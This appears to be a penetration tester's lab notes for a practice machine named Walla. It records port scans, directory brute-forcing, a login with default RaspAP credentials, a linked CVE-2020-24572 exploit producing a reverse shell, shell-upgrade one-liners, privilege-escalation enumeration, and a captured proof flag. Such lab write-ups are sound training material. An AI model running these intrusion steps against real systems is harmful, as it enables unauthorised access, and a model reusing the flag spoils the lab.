**Metadata**

- IP Address:  192.168.219.97
- Hostname:  Wala
- OS: 	
- Found Credentials/Users:
		admin/secret

Main Objectives:

Local.txt = 
Proof.txt = 35e824fc01375d9a5bb45633cae78731

**Enumeration**

1. NMAP Scans (TCP/UDP)

```
[+] Running: Nmap BASIC TCP (top 1000)
[+] Command: nmap -sS -Pn -n --top-ports 1000 -T4 --open 192.168.219.97 -oN - 
# Nmap 7.95 scan initiated Thu Mar 12 14:34:47 2026 as: nmap -sS -Pn -n --top-ports 1000 -T4 --open -oN - 192.168.219.97
Nmap scan report for 192.168.219.97
Host is up (0.090s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet
25/tcp open  smtp
53/tcp open  domain

# Nmap done at Thu Mar 12 14:34:49 2026 -- 1 IP address (1 host up) scanned in 1.33 seconds
[+] Running: Nmap ALL TCP (all ports + versions)
[+] Command: nmap -sS -Pn -n -p- -T4 --open -sV --version-all 192.168.219.97 -oN /home/kali/ProvingGround/Walla/nmap/full_tcp.nmap -oG /home/kali/ProvingGround/Walla/nmap/full_tcp.gnmap 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 14:34 MDT
Nmap scan report for 192.168.219.97
Host is up (0.091s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
23/tcp    open  telnet     Linux telnetd
25/tcp    open  smtp       Postfix smtpd
53/tcp    open  tcpwrapped
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
8091/tcp  open  http       lighttpd 1.4.53
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

2. Interesting Ports/Services

```
[+] Open TCP ports (open only): 22, 23, 25, 53, 422, 8091, 42042
[+] Open UDP ports (open only): <none>
```

3. SSH Enumeration

```
22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)

```

4. Telnet Enumeration (Port 23)

```
23/tcp    open  telnet     Linux telnetd

└─$ nmap -p 23 --script telnet-brute 192.168.219.97
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 14:52 MDT
Couldn't open a raw socket. Error: Operation not permitted (1)
                                                                                                                    
┌──(kali㉿Kali)-[~/scripts/pg_recon]
└─$ sudo nmap -p 23 --script telnet-brute 192.168.219.97
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 14:52 MDT
NSE: [telnet-brute] usernames: Time limit 10m00s exceeded.
NSE: [telnet-brute] usernames: Time limit 10m00s exceeded.
NSE: [telnet-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for 192.168.219.97
Host is up (0.22s latency).

PORT   STATE SERVICE
23/tcp open  telnet
| telnet-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 3271 guesses in 602 seconds, average tps: 5.1

Nmap done: 1 IP address (1 host up) scanned in 604.15 seconds

```

5. SMTP Enumeration (Port 25)

```
25/tcp    open  smtp       Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
| ssl-cert: Subject: commonName=walla
| Subject Alternative Name: DNS:walla
| Not valid before: 2020-09-17T18:26:36
|_Not valid after:  2030-09-15T18:26:36

nmap -p 25 --script smtp-commands 192.168.219.97
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 14:57 MDT
Couldn't open a raw socket. Error: Operation not permitted (1)
                                                                                                                    
┌──(kali㉿Kali)-[~/scripts/pg_recon]
└─$ sudo nmap -p 25 --script smtp-commands 192.168.219.97
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 14:58 MDT
Nmap scan report for 192.168.219.97
Host is up (0.075s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
                                                                                                                    
┌──(kali㉿Kali)-[~/scripts/pg_recon]
└─$ sudo nmap -p 25 --script smtp-enum-users 192.168.219.97
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 14:58 MDT
Nmap scan report for 192.168.219.97
Host is up (0.081s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-enum-users: 
|_  Method RCPT returned a unhandled status code.

Nmap done: 1 IP address (1 host up) scanned in 1.03 seconds
                                                                                                                    
┌──(kali㉿Kali)-[~/scripts/pg_recon]
└─$ sudo nmap -p 25 --script smtp-ntlm-info 192.168.219.97
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 14:58 MDT
Nmap scan report for 192.168.219.97
Host is up (0.076s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds
                                                                                                                    
┌──(kali㉿Kali)-[~/scripts/pg_recon]
└─$ sudo nmap -p 25 --script smtp-open-relay 192.168.219.97
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 15:01 MDT
Nmap scan report for 192.168.219.97
Host is up (0.079s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed

Nmap done: 1 IP address (1 host up) scanned in 22.55 seconds


```

5. Port 422 (SSH)

```
422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)

```

5. Web Enumeration  (Port 8091)

```
8091/tcp  open  http       lighttpd 1.4.53
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=RaspAP
|_http-server-header: lighttpd/1.4.53
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).


Webserver Info - 
Running Applications - 
Site Visit - 
1. Found /package.json, /composer.json, /README.md
2. In readme.md file found that this is as RaspAP server and that the default creds are admin/secret.
3. Was able to authenticate using admin/secret.

whatweb -v http://target

[+] Directory search BASIC on HTTP ports: 8091
[+] Running: Gobuster BASIC (8091)
[+] Command: gobuster dir -u http://192.168.219.97:8091 -w /usr/share/wordlists/dirb/common.txt -t 50 -o /home/kali/ProvingGround/Walla/gobuster/Walla_192.168.219.97_8091_dir_basic.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.97:8091
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/_layouts             (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/_layouts/]
/ajax                 (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/ajax/]
/app                  (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/app/]
/config               (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/config/]
/dist                 (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/dist/]
/favicon.ico          (Status: 200) [Size: 1150]
/includes             (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/includes/]
/index.php            (Status: 401) [Size: 15]
/locale               (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/locale/]
/LICENSE              (Status: 200) [Size: 35146]
/templates            (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/templates/]
Progress: 4564 / 4613 (98.94%)
Progress: 4613 / 4613 (100.00%)===============================================================
Finished

[+] Directory search ADVANCED on HTTP ports: 8091
[+] Running: Gobuster ADVANCED (8091)
[+] Command: gobuster dir -u http://192.168.219.97:8091 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Walla/gobuster/Walla_192.168.219.97_8091_dir_advanced.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.97:8091
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/templates            (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/templates/]
/ajax                 (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/ajax/]
/includes             (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/includes/]
/app                  (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/app/]
/config               (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/config/]
/dist                 (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/dist/]
/LICENSE              (Status: 200) [Size: 35146]
/locale               (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/locale/]
/installers           (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/installers/]
/_layouts             (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/_layouts/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished

[+] Running: Gobuster FILE search (8091)
[+] Command: gobuster dir -u http://192.168.219.97:8091 -w /usr/share/wordlists/dirb/common.txt -x php\,asp\,aspx\,jsp\,html\,txt\,bak\,old\,zip\,tar\,tar.gz -t 50 -o /home/kali/ProvingGround/Walla/gobuster/Walla_192.168.219.97_8091_files.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.97:8091
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              asp,aspx,html,bak,old,zip,php,jsp,txt,tar,tar.gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/_layouts             (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/_layouts/]
/ajax                 (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/ajax/]
/app                  (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/app/]
/config               (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/config/]
/dist                 (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/dist/]
/favicon.ico          (Status: 200) [Size: 1150]
/includes             (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/includes/]
/index.php            (Status: 401) [Size: 15]
/index.php            (Status: 401) [Size: 15]
/LICENSE              (Status: 200) [Size: 35146]
/locale               (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/locale/]
/templates            (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/templates/]
Progress: 55356 / 55356 (100.00%)
===============================================================
Finished

[+] Directory search LOWERCASE (medium) on HTTP ports: 8091
[+] Running: Gobuster LOWERCASE dir (8091)
[+] Command: gobuster dir -u http://192.168.219.97:8091 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -o /home/kali/ProvingGround/Walla/gobuster/Walla_192.168.219.97_8091_dir_lowercase.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.219.97:8091
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/templates            (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/templates/]
/ajax                 (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/ajax/]
/includes             (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/includes/]
/app                  (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/app/]
/config               (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/config/]
/dist                 (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/dist/]
/locale               (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/locale/]
/installers           (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/installers/]
/_layouts             (Status: 301) [Size: 0] [--> http://192.168.219.97:8091/_layouts/]
Progress: 207620 / 207641 (99.99%)
===============================================================
Finished

curl -i http://target

[+] Curl snapshots on HTTP ports: 8091
[+] Running: Curl snapshot (8091)
[+] Command: curl -k -L -sS -i --connect-timeout 5 --max-time 30 http://192.168.219.97:8091 
HTTP/1.1 401 Unauthorized
Set-Cookie: PHPSESSID=nhgeqrd4nvbtt3fmnfhe43oe5n; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
WWW-Authenticate: Basic realm="RaspAP"
Content-type: text/html; charset=UTF-8
Content-Length: 15
Date: Thu, 12 Mar 2026 21:01:04 GMT
Server: lighttpd/1.4.53

[+] Nikto scan on HTTP ports: 8091
[+] Running: Nikto (8091)
[+] Command: nikto -h http://192.168.219.97:8091 -output /home/kali/ProvingGround/Walla/web/192.168.219.97_8091/nikto.txt -Format txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.219.97
+ Target Hostname:    192.168.219.97
+ Target Port:        8091
+ Start Time:         2026-03-12 15:01:05 (GMT-6)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.53
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ / - Requires Authentication for realm 'RaspAP'
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
+ /composer.json: PHP Composer configuration file reveals configuration information. See: https://getcomposer.org/
+ /package.json: Node.js package file found. It may contain sensitive information.
+ /README.md: Readme Found.
+ 8254 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2026-03-12 15:13:39 (GMT-6) (754 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


```

6. Port 42024 (SSH)

```
42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


10. Possible Exploits

```
https://www.exploit-db.com/exploits/50224
https://github.com/gerbsec/CVE-2020-24572-POC/blob/main/exploit.py

```

11. Other Notes

```

```

**Initial Foothold** 

1. Exploit Steps

- After logging in to the RaspAP with admin/secret credentials, discovered that the version running was 2.5. 

- Did a search for RaspAP and found an exploit on Github at https://github.com/gerbsec/CVE-2020-24572-POC/blob/main/exploit.py. 

- Downloaded and ran the exploit. 

![[Pasted image 20260312154927.png]]

- Received a reverse shell as www-data.

![[Pasted image 20260312155031.png]]

2. Shell Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import pty; pty.spawn("/bin/bash")'

/usr/bin/script -qc /bin/bash /dev/null

export TERM=xterm

export SHELL=/bin/bash

Ctrl+Z

stty raw -echo; fg

reset
```

**Post-Exploitation**

1. Identify & System Info

```
www-data@walla:/home/walter$ whoami
www-data
www-data@walla:/home/walter$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@walla:/home/walter$ hostname
walla
www-data@walla:/home/walter$ uname -a
Linux walla 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux


```

2. Environment

```
SHELL=/usr/bin/bash
PHP_FCGI_MAX_REQUESTS=10000
PWD=/home/walter
TERM=xterm-256color
SHLVL=4
LC_CTYPE=C.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_FCGI_CHILDREN=4
OLDPWD=/home
_=/usr/bin/env

BASH=/bin/bash
BASHOPTS=checkwinsize:cmdhist:complete_fullquote:expand_aliases:extquote:force_fignore:globasciiranges:hostcomplete:interactive_comments:progcomp:promptvars:sourcepath
BASH_ALIASES=()
BASH_ARGC=([0]="0")
BASH_ARGV=()
BASH_CMDS=()
BASH_LINENO=()
BASH_SOURCE=()
BASH_VERSINFO=([0]="5" [1]="0" [2]="3" [3]="1" [4]="release" [5]="x86_64-pc-linux-gnu")
BASH_VERSION='5.0.3(1)-release'
COLUMNS=80
DIRSTACK=()
EUID=33
GROUPS=()
HISTFILE=/var/www/.bash_history
HISTFILESIZE=500
HISTSIZE=500
HOSTNAME=walla
HOSTTYPE=x86_64
IFS=$' \t\n'
LC_CTYPE=C.UTF-8
LINES=24
MACHTYPE=x86_64-pc-linux-gnu
MAILCHECK=60
OLDPWD=/home
OPTERR=1
OPTIND=1
OSTYPE=linux-gnu
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_FCGI_CHILDREN=4
PHP_FCGI_MAX_REQUESTS=10000
PIPESTATUS=([0]="0")
PPID=31683
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
PS2='> '
PS4='+ '
PWD=/home/walter
SHELL=/usr/bin/bash
SHELLOPTS=braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor
SHLVL=4
TERM=xterm-256color
UID=33
_=env

/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

HOME=
SHELL=/usr/bin/bash

```

3. User & Home Directories

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
terry:x:1002:1002::/home/terry:/bin/bash
walter:x:1003:1003::/home/walter:/bin/bash
janis:x:1004:1004::/home/janis:/bin/bash

ls -la /home
drwxr-xr-x  6 root     root     4096 Sep 17  2020 .
drwxr-xr-x 18 root     root     4096 Sep 17  2020 ..
drwxr-xr-x  2 janis    janis    4096 Mar  4  2021 janis
drwxr-xr-x  2 paige    paige    4096 Sep 17  2020 paige
drwxr-xr-x  2 terry    terry    4096 Sep 17  2020 terry
drwxr-xr-x  2 www-data www-data 4096 Sep 17  2020 walter

ls -la /root 2>/dev/null

sudo -l
Matching Defaults entries for www-data on walla:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on walla:
    (ALL) NOPASSWD: /sbin/ifup
    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service

```

4. Writable Paths & Permissions

```
find / -writable -type d 2>/dev/null | head -n 50
/var/log/lighttpd
/var/www/html
/var/www/html/templates
/var/www/html/templates/adblock
/var/www/html/templates/dhcp
/var/www/html/templates/about
/var/www/html/app
/var/www/html/app/css
/var/www/html/app/pitft
/var/www/html/app/icons
/var/www/html/app/img
/var/www/html/app/js
/var/www/html/app/lib
/var/www/html/config
/var/www/html/ajax
/var/www/html/ajax/adblock
/var/www/html/ajax/bandwidth
/var/www/html/ajax/networking
/var/www/html/_layouts
/var/www/html/includes
/var/www/html/installers
/var/www/html/locale
/var/www/html/locale/fr_FR
/var/www/html/locale/fr_FR/LC_MESSAGES
/var/www/html/locale/ja_JP
/var/www/html/locale/ja_JP/LC_MESSAGES
/var/www/html/locale/tr_TR
/var/www/html/locale/tr_TR/LC_MESSAGES
/var/www/html/locale/nl_NL
/var/www/html/locale/nl_NL/LC_MESSAGES
/var/www/html/locale/vi_VN
/var/www/html/locale/vi_VN/LC_MESSAGES
/var/www/html/locale/es_MX
/var/www/html/locale/es_MX/LC_MESSAGES
/var/www/html/locale/fi_FI
/var/www/html/locale/fi_FI/LC_MESSAGES
/var/www/html/locale/zh_TW
/var/www/html/locale/zh_TW/LC_MESSAGES
/var/www/html/locale/id_ID
/var/www/html/locale/id_ID/LC_MESSAGES
/var/www/html/locale/it_IT
/var/www/html/locale/it_IT/LC_MESSAGES
/var/www/html/locale/da_DK
/var/www/html/locale/da_DK/LC_MESSAGES
/var/www/html/locale/ru_RU
/var/www/html/locale/ru_RU/LC_MESSAGES
/var/www/html/locale/sv_SE
/var/www/html/locale/sv_SE/LC_MESSAGES
/var/www/html/locale/de_DE
/var/www/html/locale/de_DE/LC_MESSAGES

find / -writable -type f 2>/dev/null | head -n 50
/var/log/lighttpd/error.log.2.gz
/var/log/lighttpd/error.log.1
/var/log/lighttpd/error.log
/var/log/lighttpd/error.log.3.gz
/var/www/html/templates/hostapd.php
/var/www/html/templates/adblock/logging.php
/var/www/html/templates/adblock/general.php
/var/www/html/templates/adblock/stats.php
/var/www/html/templates/system.php
/var/www/html/templates/dhcp/static_leases.php
/var/www/html/templates/dhcp/logging.php
/var/www/html/templates/dhcp/advanced.php
/var/www/html/templates/dhcp/general.php
/var/www/html/templates/dhcp/clients.php
/var/www/html/templates/wifi_stations.php
/var/www/html/templates/themes.php
/var/www/html/templates/about/sponsors.php
/var/www/html/templates/about/general.php
/var/www/html/templates/dhcp.php
/var/www/html/templates/adblock.php
/var/www/html/templates/about.php
/var/www/html/templates/openvpn.php
/var/www/html/templates/configure_client.php
/var/www/html/templates/dashboard.php
/var/www/html/templates/torproxy.php
/var/www/html/templates/networking.php
/var/www/html/templates/admin.php
/var/www/html/templates/data_usage.php
/var/www/html/gulpfile.js
/var/www/html/app/css/hackernews.css
/var/www/html/app/css/lightsout.css
/var/www/html/app/css/custom.php
/var/www/html/app/pitft/stats.py
/var/www/html/app/icons/site.webmanifest
/var/www/html/app/icons/favicon-16x16.png
/var/www/html/app/icons/favicon-32x32.png
/var/www/html/app/icons/browserconfig.xml
/var/www/html/app/icons/android-chrome-192x192.png
/var/www/html/app/icons/mstile-150x150.png
/var/www/html/app/icons/apple-touch-icon.png
/var/www/html/app/icons/safari-pinned-tab.svg
/var/www/html/app/icons/favicon.png
/var/www/html/app/img/bg.png
/var/www/html/app/img/wifi-qr-code.php
/var/www/html/app/img/loading-spinner.gif
/var/www/html/app/img/raspAP-logo.png
/var/www/html/app/img/authors-8bit-200px.png
/var/www/html/app/img/raspAP-logo.php
/var/www/html/app/js/dashboardchart.js
/var/www/html/app/js/bandwidthcharts.min.js

echo "$PATH" | tr ':' '\n' | while read -r p; do [ -z "$p" ] && continue; if [ -w "$p" ]; then echo "WRITABLE: $p"; else echo "OK: $p"; fi; done
OK: /usr/local/sbin
OK: /usr/local/bin
OK: /usr/sbin
OK: /usr/bin
OK: /sbin
OK: /bin

find / -user "$(id -un)" -type f 2>/dev/null | head -n 50
/var/log/lighttpd/error.log.2.gz
/var/log/lighttpd/error.log.1
/var/log/lighttpd/error.log
/var/log/lighttpd/error.log.3.gz
/var/www/html/templates/hostapd.php
/var/www/html/templates/adblock/logging.php
/var/www/html/templates/adblock/general.php
/var/www/html/templates/adblock/stats.php
/var/www/html/templates/system.php
/var/www/html/templates/dhcp/static_leases.php
/var/www/html/templates/dhcp/logging.php
/var/www/html/templates/dhcp/advanced.php
/var/www/html/templates/dhcp/general.php
/var/www/html/templates/dhcp/clients.php
/var/www/html/templates/wifi_stations.php
/var/www/html/templates/themes.php
/var/www/html/templates/about/sponsors.php
/var/www/html/templates/about/general.php
/var/www/html/templates/dhcp.php
/var/www/html/templates/adblock.php
/var/www/html/templates/about.php
/var/www/html/templates/openvpn.php
/var/www/html/templates/configure_client.php
/var/www/html/templates/dashboard.php
/var/www/html/templates/torproxy.php
/var/www/html/templates/networking.php
/var/www/html/templates/admin.php
/var/www/html/templates/data_usage.php
/var/www/html/gulpfile.js
/var/www/html/app/css/hackernews.css
/var/www/html/app/css/lightsout.css
/var/www/html/app/css/custom.php
/var/www/html/app/pitft/stats.py
/var/www/html/app/icons/site.webmanifest
/var/www/html/app/icons/favicon-16x16.png
/var/www/html/app/icons/favicon-32x32.png
/var/www/html/app/icons/browserconfig.xml
/var/www/html/app/icons/android-chrome-192x192.png
/var/www/html/app/icons/mstile-150x150.png
/var/www/html/app/icons/apple-touch-icon.png
/var/www/html/app/icons/safari-pinned-tab.svg
/var/www/html/app/icons/favicon.png
/var/www/html/app/img/bg.png
/var/www/html/app/img/wifi-qr-code.php
/var/www/html/app/img/loading-spinner.gif
/var/www/html/app/img/raspAP-logo.png
/var/www/html/app/img/authors-8bit-200px.png
/var/www/html/app/img/raspAP-logo.php
/var/www/html/app/js/dashboardchart.js
/var/www/html/app/js/bandwidthcharts.min.js

ls -l /etc/passwd 2>/dev/null
-rw-r--r-- 1 root root 1972 Sep 17  2020 /etc/passwd

ls -l /etc/shadow 2>/dev/null
-rw-r----- 1 root shadow 1532 Sep 17  2020 /etc/shadow

ls -la / 2>/dev/null
drwxr-xr-x  18 root root  4096 Sep 17  2020 .
drwxr-xr-x  18 root root  4096 Sep 17  2020 ..
lrwxrwxrwx   1 root root     7 Sep 17  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Sep 17  2020 boot
drwxr-xr-x  16 root root  3180 Feb 26  2025 dev
drwxr-xr-x 102 root root  4096 Sep 17  2020 etc
drwxr-xr-x   6 root root  4096 Sep 17  2020 home
lrwxrwxrwx   1 root root    31 Sep 17  2020 initrd.img -> boot/initrd.img-4.19.0-10-amd64
lrwxrwxrwx   1 root root    30 Sep 17  2020 initrd.img.old -> boot/initrd.img-4.19.0-8-amd64
lrwxrwxrwx   1 root root     7 Sep 17  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Sep 17  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Sep 17  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Sep 17  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Sep 17  2020 lost+found
drwxr-xr-x   3 root root  4096 Sep 17  2020 media
drwxr-xr-x   2 root root  4096 Sep 17  2020 mnt
drwxr-xr-x   2 root root  4096 Sep 17  2020 opt
dr-xr-xr-x 128 root root     0 Feb 26  2025 proc
drwx------   2 root root  4096 Mar 12 16:32 root
drwxr-xr-x  23 root root   640 Mar 12 16:32 run
lrwxrwxrwx   1 root root     8 Sep 17  2020 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Sep 17  2020 srv
dr-xr-xr-x  13 root root     0 Feb 26  2025 sys
drwxrwxrwt  11 root root  4096 Mar 12 17:39 tmp
drwxr-xr-x  13 root root  4096 Sep 17  2020 usr
drwxr-xr-x  12 root root  4096 Sep 17  2020 var
lrwxrwxrwx   1 root root    28 Sep 17  2020 vmlinuz -> boot/vmlinuz-4.19.0-10-amd64
lrwxrwxrwx   1 root root    27 Sep 17  2020 vmlinuz.old -> boot/vmlinuz-4.19.0-8-amd64

```

4. SUID / SGID / Capabilities

```
find / -perm -4000 -type f 2>/dev/null
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/vmware-user-suid-wrapper
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device

find / -perm -2000 -type f 2>/dev/null
/usr/sbin/unix_chkpwd
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/bin/crontab
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/expiry
/usr/bin/wall
/usr/bin/dotlockfile
/usr/bin/ssh-agent
/usr/lib/x86_64-linux-gnu/utempter/utempter

getcap -r / 2>/dev/null
/usr/bin/ping = cap_net_raw+ep

```

5. Cron & Scheduled Tasks

```
cat /etc/crontab 2>/dev/null
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
